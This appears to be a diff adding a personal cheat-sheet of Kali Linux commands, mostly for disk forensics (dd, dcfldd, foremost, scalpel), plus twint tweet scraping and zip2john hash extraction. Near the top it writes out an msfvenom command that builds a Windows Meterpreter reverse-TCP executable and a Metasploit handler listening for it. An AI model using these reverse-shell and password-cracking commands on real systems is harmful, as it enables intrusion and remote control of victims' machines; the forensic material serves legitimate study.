@@ -1,0 +1,80 @@
+zip --password password123 test.zip Ref
+
+
+Metaspoilt
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.35.128 LPORT=4444 -f exe > shell.exe
+
+
+
+msfconsole
+msf > use exploit/multi/handler 
+msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp 
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST 192.168.1.101
+LHOST => 192.168.1.101
+msf exploit(handler) > set LPORT 443
+LPORT => 443
+msf exploit(handler) > exploit
+
+sudo fdisk -l
+
+Disk Acquisition in Linux using old school DD command and DCFLDD for an expanded usage of DD.
+Command Usage : {dd if=/dev/sda of=/disk1.img}
+Where if=Source FILE / DIsk / Partition /Block  of=Destination Image
+Output Formats supported : IMG , DD
+
+
+DCFLDD : Enhanced version of dd
+Supports the following :
+1. On-the-fly hashing of the transmitted data.
+2. Progress bar of how much data has already been sent.
+3. Wiping of disks with known patterns.
+4. Verification that the image is identical to the original drive, bit-for-bit.
+5. Simultaneous output to more than one file/disk is possible.
+6. The output can be split into multiple files.
+7. Logs and data can be piped into external applications.
+
+Command Usage : {dcfldd if=/dev/sourcedrive hash=md5,sha256 hashwindow=10G md5log=md5.txt sha256log=sha256.txt \
+       hashconv=after bs=512 conv=noerror,sync split=10G splitformat=aa of=destinationdriveimage.dd}
+Where 
+* hash=NAME
+    Available parameters : md5, sha1, sha256, sha384 or sha512
+Note-
+By default  algorithm  is set to md5. To select multiple algorithms , seperate the hash names using comma.
+
+* bs=BYTES
+Defines Number of Bytes , used after setting a parameter to define the number of bytes on that operation
+
+* hashwindow=BYTES
+Helps you to perform hash on every 'X BYTES' amount of data
+
+* hashconv=[before|after]
+Helps you to perform the hashing before or after the BS 
+
+*conv=KEYWORDS
+convert the file as per the comma separated keyword list e.g. noerror/sync
+
+
+
+FOREMOST:
+root@kali:~# foremost -t doc,jpg,pdf,xls -i image.dd
+Processing: image.dd
+|*|
+root@kali:~# ls output/
+audit.txt  jpg  pdf
+
+SCALPEL:
+scalpel -o /root/Desktop/demo /dev/sdb
+To change configuration file go to etc/scalpel/scalpel.conf
+
+
+TWINT:
+twint -s "Donald Trump" --verified
+twint -s "Donald Trump" --verified -o test.csv --csv
+
+
+JOHN:
+zip2john /root/Desktop/test123.zip > hash.txt
+
+
+
